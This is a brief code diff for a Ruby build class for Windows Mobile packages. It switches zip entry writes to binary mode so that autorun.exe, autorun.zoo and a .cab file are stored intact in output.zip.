@@ -95,15 +95,15 @@ class BuildWinMo < Build
     case params['type']
       when 'local'
         Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-          z.file.open('autorun.exe', "w") { |f| f.write File.open(path('autorun.exe'), 'rb') {|f| f.read} }
-          z.file.open('autorun.zoo', "w") { |f| f.write File.open(path('autorun.zoo'), 'rb') {|f| f.read} }
+          z.file.open('autorun.exe', "wb") { |f| f.write File.open(path('autorun.exe'), 'rb') {|f| f.read} }
+          z.file.open('autorun.zoo', "wb") { |f| f.write File.open(path('autorun.zoo'), 'rb') {|f| f.read} }
         end
         # this is the only file we need to output after this point
         @outputs = ['output.zip']
 
       when 'remote'
         Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-          z.file.open(@appname + '.cab', "w") { |f| f.write File.open(path(@appname + '.cab'), 'rb') {|f| f.read} }
+          z.file.open(@appname + '.cab', "wb") { |f| f.write File.open(path(@appname + '.cab'), 'rb') {|f| f.read} }
         end
         # this is the only file we need to output after this point
         @outputs = ['output.zip']
